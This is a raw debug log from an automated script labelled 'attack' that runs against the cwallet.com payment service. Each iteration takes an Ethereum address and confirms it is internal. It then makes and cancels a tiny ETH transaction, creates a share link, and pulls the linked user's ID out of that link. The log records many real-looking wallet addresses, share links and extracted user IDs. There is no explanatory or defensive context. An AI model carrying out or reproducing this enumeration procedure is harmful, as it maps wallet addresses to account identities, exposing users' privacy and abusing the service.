2026-03-06 23:57:03,047 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:32,641 | DEBUG | attack | Generated billId: 202603062157492030040177165500416
2026-03-06 23:57:32,642 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:32,791 | DEBUG | attack | Share link created: https://s.cwallet.com/11r00t9
2026-03-06 23:57:32,793 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:32,941 | DEBUG | attack | Share link created: https://s.cwallet.com/13sobmg
2026-03-06 23:57:32,943 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:33,061 | DEBUG | attack | Generated billId: 202603062157492030040177324883968
2026-03-06 23:57:33,062 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:33,171 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:33,188 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:33,189 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:33,303 | DEBUG | attack | Transaction ID: 202603062157472030040169999130624
2026-03-06 23:57:33,307 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:33,467 | DEBUG | attack | Transaction result: {'bill_id': '202603062157472030040170366533632', 'type': 3}
2026-03-06 23:57:33,470 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:34,230 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:34,289 | DEBUG | attack | Transaction ID: 202603062157492030040177481768960
2026-03-06 23:57:34,290 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:34,444 | DEBUG | attack | Extracted userId: 57396043
2026-03-06 23:57:34,446 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:34,446 | DEBUG | attack | Target address: 0x49188c765a4aa831b39853726f163f558b5e6d11 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:34,446 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:34,829 | DEBUG | attack | Share link created: https://s.cwallet.com/zydjrf
2026-03-06 23:57:34,830 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:34,998 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:35,132 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:35,136 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:35,230 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:35,230 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:35,316 | DEBUG | attack | Transaction result: {'bill_id': '202603062157492030040177165500416', 'type': 3}
2026-03-06 23:57:35,317 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:35,426 | DEBUG | attack | Transaction result: {'bill_id': '202603062157492030040177324883968', 'type': 3}
2026-03-06 23:57:35,427 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:35,832 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:36,399 | DEBUG | attack | Extracted userId: 46157277
2026-03-06 23:57:36,430 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:36,437 | DEBUG | attack | Target address: 0xf2521135d6cefeb7bea1c619f584cbb115e63ea9 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:36,437 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:36,659 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:36,664 | DEBUG | attack | Generated billId: 202603062157532030040193699446784
2026-03-06 23:57:36,666 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:36,775 | DEBUG | attack | Transaction ID: 202603062157512030040184918269952
2026-03-06 23:57:36,776 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:36,914 | DEBUG | attack | Extracted userId: 57638579
2026-03-06 23:57:36,921 | DEBUG | attack | Transaction ID: 202603062157512030040185203486720
2026-03-06 23:57:36,927 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:37,146 | DEBUG | attack | Share link created: https://s.cwallet.com/15xj7gj
2026-03-06 23:57:37,154 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:37,299 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:37,300 | DEBUG | attack | Target address: 0xe544da02c385a015a063acc6aa6d92e744794f65 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:37,300 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:37,439 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:37,441 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:37,546 | DEBUG | attack | Generated billId: 202603062157532030040195226173440
2026-03-06 23:57:37,547 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:38,350 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:38,410 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:38,412 | DEBUG | attack | Share link created: https://s.cwallet.com/zi794o
2026-03-06 23:57:38,413 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:38,522 | DEBUG | attack | Extracted userId: 37248661
2026-03-06 23:57:38,525 | DEBUG | attack | Share link created: https://s.cwallet.com/179sj8z
2026-03-06 23:57:38,525 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:38,670 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:38,676 | DEBUG | attack | Target address: 0x0d80cdefdb42b0c7978640976ac101fe33148d56 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:38,681 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:38,772 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:38,919 | DEBUG | attack | Transaction result: {'bill_id': '202603062157532030040193699446784', 'type': 3}
2026-03-06 23:57:38,921 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:39,027 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:39,028 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:39,181 | DEBUG | attack | Transaction result: {'bill_id': '202603062157532030040195226173440', 'type': 3}
2026-03-06 23:57:39,198 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:40,003 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:40,033 | DEBUG | attack | Generated billId: 202603062157562030040208954130432
2026-03-06 23:57:40,035 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:40,179 | DEBUG | attack | Extracted userId: 57004120
2026-03-06 23:57:40,183 | DEBUG | attack | Transaction ID: 202603062157552030040201980698624
2026-03-06 23:57:40,185 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:40,314 | DEBUG | attack | Transaction ID: 202603062157552030040202395934720
2026-03-06 23:57:40,315 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:40,399 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:40,402 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:40,514 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:40,516 | DEBUG | attack | Target address: 0xb994add8ef6775b58cba559525a57d449937adb3 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:40,516 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:40,623 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:40,624 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:40,730 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:40,824 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:41,580 | DEBUG | attack | Extracted userId: 30395435
2026-03-06 23:57:41,587 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:41,590 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:41,591 | DEBUG | attack | Target address: 0x5d72c3085c3800c0da9ca50ff256f893ef40c6a3 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:41,592 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:41,766 | DEBUG | attack | Share link created: https://s.cwallet.com/zm9jue
2026-03-06 23:57:41,768 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:41,975 | DEBUG | attack | Share link created: https://s.cwallet.com/1b5b59s
2026-03-06 23:57:41,976 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:42,198 | DEBUG | attack | Extracted userId: 31270769
2026-03-06 23:57:42,199 | DEBUG | attack | Generated billId: 202603062157582030040215757291520
2026-03-06 23:57:42,200 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:42,366 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:42,373 | DEBUG | attack | Target address: 0x14ecd337a728025480aa4e021515413d712bf302 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:42,373 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:42,505 | DEBUG | attack | Transaction result: {'bill_id': '202603062157562030040208954130432', 'type': 3}
2026-03-06 23:57:42,506 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:42,611 | DEBUG | attack | Generated billId: 202603062157582030040216566792192
2026-03-06 23:57:42,612 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:42,706 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:43,493 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:43,520 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:43,601 | DEBUG | attack | Transaction ID: 202603062157582030040215599607808
2026-03-06 23:57:43,602 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:43,703 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:43,704 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:43,829 | DEBUG | attack | Transaction result: {'bill_id': '202603062157582030040215757291520', 'type': 3}
2026-03-06 23:57:43,830 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:43,958 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:43,960 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:44,097 | DEBUG | attack | Generated billId: 202603062158002030040224754073600
2026-03-06 23:57:44,099 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:44,197 | DEBUG | attack | Transaction result: {'bill_id': '202603062157582030040216566792192', 'type': 3}
2026-03-06 23:57:44,198 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:44,338 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:45,096 | DEBUG | attack | Share link created: https://s.cwallet.com/10s0i2w
2026-03-06 23:57:45,096 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:45,198 | DEBUG | attack | Extracted userId: 58459832
2026-03-06 23:57:45,200 | DEBUG | attack | Transaction ID: 202603062158002030040223572979712
2026-03-06 23:57:45,203 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:45,323 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:45,324 | DEBUG | attack | Target address: 0x458fae4fa8612573b36d03799ee449a315fed193 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:45,324 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:45,445 | DEBUG | attack | Transaction ID: 202603062158002030040224046936064
2026-03-06 23:57:45,446 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:45,560 | DEBUG | attack | Generated billId: 202603062158022030040230999392256
2026-03-06 23:57:45,561 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:45,651 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:45,751 | DEBUG | attack | Extracted userId: 27104629
2026-03-06 23:57:45,755 | DEBUG | attack | Transaction result: {'bill_id': '202603062158002030040224754073600', 'type': 3}
2026-03-06 23:57:45,756 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:45,888 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:45,888 | DEBUG | attack | Target address: 0xbaf08c4b1151af262e145433ae7615f294fa99a0 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:45,889 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:46,009 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:46,719 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:46,720 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:46,796 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:46,802 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:46,811 | DEBUG | attack | Transaction ID: 202603062158022030040230950756352
2026-03-06 23:57:46,812 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:46,917 | DEBUG | attack | Share link created: https://s.cwallet.com/188v4yj
2026-03-06 23:57:46,919 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:47,026 | DEBUG | attack | Share link created: https://s.cwallet.com/16fd4q0
2026-03-06 23:57:47,027 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:47,130 | DEBUG | attack | Generated billId: 202603062158032030040237508952064
2026-03-06 23:57:47,131 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:47,217 | DEBUG | attack | Generated billId: 202603062158032030040237328596992
2026-03-06 23:57:47,218 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:47,322 | DEBUG | attack | Transaction result: {'bill_id': '202603062158022030040230999392256', 'type': 3}
2026-03-06 23:57:47,323 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:48,006 | DEBUG | attack | Extracted userId: 1260884
2026-03-06 23:57:48,007 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:48,007 | DEBUG | attack | Target address: 0x2fb44e147f12aaa8c7871728e467c52ce0a262b3 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:48,007 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:48,153 | DEBUG | attack | Transaction ID: 202603062158032030040237464510464
2026-03-06 23:57:48,154 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:48,247 | DEBUG | attack | Share link created: https://s.cwallet.com/190a933
2026-03-06 23:57:48,248 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:48,366 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:48,367 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:48,466 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:48,467 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:48,583 | DEBUG | attack | Transaction result: {'bill_id': '202603062158032030040237328596992', 'type': 3}
2026-03-06 23:57:48,584 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:48,677 | DEBUG | attack | Transaction result: {'bill_id': '202603062158032030040237508952064', 'type': 3}
2026-03-06 23:57:48,679 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-06 23:57:48,819 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:49,093 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-06 23:57:49,350 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:49,549 | DEBUG | attack | Extracted userId: 58352828
2026-03-06 23:57:49,565 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:49,565 | DEBUG | attack | Target address: 0xa1086eea0bd6c8c5965058ea4d28cfe4751f2bd7 | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:49,565 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:49,730 | DEBUG | attack | Extracted userId: 54389470
2026-03-06 23:57:49,737 | DEBUG | attack | Transaction ID: 202603062158042030040242946465792
2026-03-06 23:57:49,739 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:49,868 | DEBUG | attack | Starting executeFullTransaction
2026-03-06 23:57:49,869 | DEBUG | attack | Target address: 0xb876757a53f49dc38ca311e601c949bfc938f90f | Amount: 0.00000001 | Coin: ETH
2026-03-06 23:57:49,869 | DEBUG | attack | Step 1: Checking internal address
2026-03-06 23:57:49,967 | DEBUG | attack | Transaction ID: 202603062158042030040242829025280
2026-03-06 23:57:49,968 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-06 23:57:50,069 | DEBUG | attack | Share link created: https://s.cwallet.com/1ba0qtk
2026-03-06 23:57:50,072 | DEBUG | attack | Step 6: Canceling transaction
2026-03-06 23:57:50,176 | DEBUG | attack | Generated billId: 202603062158062030040249685016576
2026-03-06 23:57:50,177 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:50,260 | DEBUG | attack | Transaction canceled successfully
2026-03-06 23:57:50,262 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-06 23:57:50,374 | DEBUG | attack | Generated billId: 202603062158062030040250335133696
2026-03-06 23:57:50,377 | DEBUG | attack | Step 3: Making transaction
2026-03-06 23:57:51,087 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:51,120 | DEBUG | attack | Address confirmed as internal
2026-03-06 23:57:51,176 | DEBUG | attack | Share link created: https://s.cwallet.com/184hibd
2026-03-06 23:57:51,177 | DEBUG | attack | Step 6: Canceling transaction
